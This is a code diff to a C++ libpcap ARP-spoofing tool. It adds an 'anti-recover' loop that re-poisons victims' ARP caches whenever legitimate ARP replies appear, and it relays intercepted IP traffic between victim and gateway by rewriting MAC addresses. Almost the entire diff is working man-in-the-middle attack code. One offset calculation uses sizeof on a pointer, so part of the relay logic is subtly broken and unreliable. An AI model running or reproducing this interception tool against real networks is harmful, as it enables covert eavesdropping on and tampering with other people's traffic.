@@ -5,6 +5,7 @@
 #include "param.h"
 #include <unistd.h>
 #include "printdata.h"
+#include <signal.h>
 
 using namespace std;
 
@@ -18,7 +19,13 @@ void getSenderMAC(pcap_t *pcd,Param* param,int sessionNum);
 void getTargetMAC(pcap_t *pcd,Param* param,int sessionNum);
 void sendARPReguest(Param param,uint32_t*findIP,int print,pcap_t *pcd);
 void sendInfectionPacket(pcap_t* pcd,Param param);
-void callSendInfectionPacket(pcap_t* pcd, Param *param, int sessionNum);
+void callSendInfectionPacket(pcap_t* pcd, Param *param, int sessionNum, bool threadHanlder);
+void signalFunction(int sig);
+void modifySignalHandler(bool* signalHandler);
+void relayAntiRecover(pcap_t* pcd, Param *param, int sessionNum);
+void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket);
+
+bool threadHandler=true;
 
 struct ARPPacket{
     struct ether_header eh;
@@ -32,7 +39,7 @@ int main(int argc, char *argv[])
 
     char errBuf[PCAP_ERRBUF_SIZE];
     char* device = pcap_lookupdev(errBuf); //get device
-
+    signal(SIGINT,signalFunction); //if input ctrl + c or kill process call signalFunction
 
     Param param[protoParam.sessionNum]; //make class
 
@@ -58,7 +65,12 @@ int main(int argc, char *argv[])
         param[i].printInfo();
     }
 
-    callSendInfectionPacket(pcd,param,protoParam.sessionNum);
+
+    //callSendInfectionPacket(pcd,param,protoParam.sessionNum,threadHandler);
+    //thread t1(&callSendInfectionPacket,pcd,param,protoParam.sessionNum,threadHandler);
+    //t1.join();
+    relayAntiRecover(pcd,param,protoParam.sessionNum);
+
 
 }
 
@@ -218,9 +230,9 @@ void sendInfectionPacket(pcap_t* pcd,Param param)
 
 }
 
-void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum)
+void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum, bool threadHanlder)
 {
-    while(true)
+    while(threadHanlder)
     {
         for (int i = 0; i < sessionNum; ++i) {
             sendInfectionPacket(pcd,param[i]);
@@ -228,4 +240,100 @@ void callSendInfectionPacket(pcap_t *pcd, Param* param, int sessionNum)
         }
         sleep(3);
     }
+    cout<<"sendInfectionPacket thread killed"<<endl;
+}
+
+void signalFunction(int sig)
+{
+    (void)sig;
+    threadHandler=false;
+    cout<<"signal Function called"<<endl;
+    signal(SIGINT,SIG_DFL);
+}
+
+void relayAntiRecover(pcap_t *pcd, Param *param,int sessionNum)
+{
+    const u_char *pkt_data;
+    struct pcap_pkthdr *pktHeader;
+    int valueOfNextEx;
+
+    while(true)
+    {
+
+        //need a thread
+        valueOfNextEx=pcap_next_ex(pcd,&pktHeader,&pkt_data);
+
+        switch (valueOfNextEx)
+        {
+            case 1:
+                {
+                    //do anti recover
+                    struct ether_header *ep =(struct ether_header*)pkt_data;
+
+                    if(ntohs(ep->ether_type)==ETHERTYPE_ARP) //next packet ARP
+                    {
+                        struct ARPPacket* ARPRecover=(struct ARPPacket *)pkt_data;
+                        for (int i = 0; i < sessionNum; i++)
+                        {
+
+                            //senderPC -> gateway
+                            if(param[i].sender_Mac==ARPRecover->arp.arp_sha)
+                                if(param[i].sender_Ip==ARPRecover->arp.arp_spa) //recover about senderIP
+                                    sendInfectionPacket(pcd,param[i]);
+
+
+                            //gateway -> senderPC
+
+                            if(param[i].target_Mac==ARPRecover->arp.arp_sha)
+                                if(param[i].target_Ip==ARPRecover->arp.arp_spa) //recover about targetIP
+                                    sendInfectionPacket(pcd,param[i]);
+
+                        }
+                    }
+
+                    //do relay
+
+                    if(ntohs(ep->ether_type)==ETHERTYPE_IP)
+                    {
+                        struct iphdr *iph=(struct iphdr*)(sizeof(ep)+pkt_data);
+                        for (int i = 0; i < sessionNum; i++)
+                        {
+                            if(param[i].sender_Mac==ep->ether_shost) //if src MAC is senderMAC
+                                if(param[i].my_Mac==ep->ether_dhost) //if dest MAC is myMAC
+                                    if(!(param[i].my_Ip==&iph->daddr))//if dest IP address not mine
+                                        sendRelayPacket(pcd,pktHeader->len,param[i].my_Mac.retnMac(),param[i].target_Mac.retnMac(),pkt_data); //change src mac addr to target mac & send
+
+
+                        }
+                    }
+                 break;
+                }
+            case 0:
+                cout<<"need a sec.. to packet capture"<<endl;
+                continue;
+            case -1:
+                perror("pcap_next_ex function has an error!!");
+                exit(1);
+
+            case -2:
+                cout<<"the packet have reached EOF!!"<<endl;
+                exit(0);
+            default:
+                break;
+            }
+    }
+
+}
+
+
+
+void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket)
+{
+
+    u_char mPacket[len];
+    memcpy(mPacket,originPacket,len);
+    struct ether_header* ep=(struct ether_header*)mPacket;
+    memcpy(ep->ether_shost,mSrcMAC,ETHER_ADDR_LEN); //change sender MAC
+    memcpy(ep->ether_dhost,mDestMAC,ETHER_ADDR_LEN); //change Destination MAC
+    pcap_sendpacket(pcd,mPacket,len);
 }
